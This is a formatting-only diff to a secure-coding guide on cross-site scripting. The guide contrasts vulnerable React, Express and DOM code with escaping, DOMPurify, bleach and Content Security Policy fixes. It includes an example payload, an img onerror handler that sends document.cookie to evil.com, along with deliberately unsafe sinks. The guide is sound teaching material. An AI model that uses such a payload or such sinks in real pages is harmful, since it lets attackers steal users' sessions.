@@ -12,6 +12,7 @@ Never insert unsanitized user input into HTML. Always escape output or use frame
 ## Why This Matters
 
 XSS allows attackers to inject malicious scripts into web pages viewed by other users, enabling:
+
 - Session hijacking (stealing cookies/tokens)
 - Credential theft (keylogging, form hijacking)
 - Defacement
@@ -25,9 +26,7 @@ XSS allows attackers to inject malicious scripts into web pages viewed by other 
 ```javascript
 // React - dangerous!
 function UserProfile({ user }) {
-  return (
-    <div dangerouslySetInnerHTML={{ __html: user.bio }} />
-  );
+  return <div dangerouslySetInnerHTML={{ __html: user.bio }} />;
 }
 
 // Vanilla JS - dangerous!
@@ -38,14 +37,17 @@ const html = `<div>Hello ${username}</div>`;
 ```
 
 **Attack example:**
+
 ```javascript
-const maliciousInput = '<img src=x onerror="fetch(\'https://evil.com?cookie=\'+document.cookie)">';
+const maliciousInput =
+  '<img src=x onerror="fetch(\'https://evil.com?cookie=\'+document.cookie)">';
 // If inserted without escaping, runs attacker's JavaScript
 ```
 
 ## ✅ Correct
 
 ### React (Auto-escaping)
+
 ```jsx
 function UserProfile({ user }) {
   // ✅ React auto-escapes by default
@@ -57,13 +59,12 @@ import DOMPurify from 'dompurify';
 
 function UserProfile({ user }) {
   const sanitizedBio = DOMPurify.sanitize(user.bio);
-  return (
-    <div dangerouslySetInnerHTML={{ __html: sanitizedBio }} />
-  );
+  return <div dangerouslySetInnerHTML={{ __html: sanitizedBio }} />;
 }
 ```
 
 ### Vanilla JavaScript
+
 ```javascript
 // ✅ Use textContent for plain text
 element.textContent = userInput;
@@ -79,6 +80,7 @@ element.innerHTML = DOMPurify.sanitize(userHtml);
 ```
 
 ### Backend (Express + Template Engines)
+
 ```javascript
 // ✅ Template engines auto-escape
 // EJS
@@ -95,6 +97,7 @@ div!= username              // NOT escaped (dangerous)
 ```
 
 ### Python (Flask/Jinja2)
+
 ```python
 from markupsafe import escape
 
@@ -112,6 +115,7 @@ def user_profile(username):
 ## Types of XSS
 
 ### 1. Reflected XSS
+
 ```javascript
 // ❌ Dangerous: reflects URL parameter into page
 app.get('/search', (req, res) => {
@@ -127,6 +131,7 @@ app.get('/search', (req, res) => {
 ```
 
 ### 2. Stored XSS
+
 ```javascript
 // ❌ Dangerous: stores unsanitized input
 app.post('/comment', async (req, res) => {
@@ -136,7 +141,7 @@ app.post('/comment', async (req, res) => {
 // Later displayed without escaping
 app.get('/comments', async (req, res) => {
   const comments = await db.comments.find();
-  const html = comments.map(c => `<p>${c.text}</p>`).join('');
+  const html = comments.map((c) => `<p>${c.text}</p>`).join('');
   res.send(html);
 });
 
@@ -150,6 +155,7 @@ app.post('/comment', async (req, res) => {
 ```
 
 ### 3. DOM-based XSS
+
 ```javascript
 // ❌ Dangerous: uses URL fragment in DOM manipulation
 const username = location.hash.substring(1);
@@ -176,6 +182,7 @@ app.use((req, res, next) => {
 ```
 
 **What CSP prevents:**
+
 - Inline scripts from executing
 - Scripts from unauthorized domains
 - eval() and similar dangerous functions
@@ -183,6 +190,7 @@ app.use((req, res, next) => {
 ## Sanitization Libraries
 
 ### DOMPurify (Browser & Node.js)
+
 ```javascript
 import DOMPurify from 'dompurify';
 
@@ -192,11 +200,12 @@ const clean = DOMPurify.sanitize(dirty);
 // Custom config
 const clean = DOMPurify.sanitize(dirty, {
   ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
-  ALLOWED_ATTR: ['href']
+  ALLOWED_ATTR: ['href'],
 });
 ```
 
 ### bleach (Python)
+
 ```python
 import bleach
 
